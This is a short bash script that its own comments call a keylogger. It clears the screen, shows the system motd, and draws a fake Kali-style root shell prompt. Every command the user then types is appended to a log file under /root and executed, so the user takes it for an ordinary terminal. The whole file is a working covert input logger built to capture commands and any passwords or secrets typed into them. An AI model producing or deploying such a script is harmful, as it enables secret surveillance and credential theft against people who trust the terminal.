#!/bin/bash
# This script will run a keylogger
# and display a fake terminal prompt

Log=/root/keylogger/log.txt

# Clear the terminal
clear

# Show the motd
cat /etc/motd

# Loop forever
while true
do

# Get current terminal prompt
promptp11="┌──(" #blue
promptp12=$(whoami) #red
promptp13="㉿kali" #red
promptp14=")-[" #blue
promptp15=$(pwd) #green

# Replace home directory with ~
promptp15=${promptp15//"$HOME"/"~"}

promptp16="]" #blue
promptp21="└─" #blue
promptp22="#" #red

# Display the prompt formatted for the user
printf "\e[1;34m$promptp11\e[1;31m$promptp12\e[1;31m$promptp13\e[1;34m$promptp14\e[1;32m$promptp15\e[1;34m$promptp16\n\e[1;34m$promptp21\e[1;31m$promptp22\e[0m "

# Read user input
read input

if [ -z "$input" ]; then
exit
fi

# save the input to a file
echo $input >> $Log

# Run the command
$input

done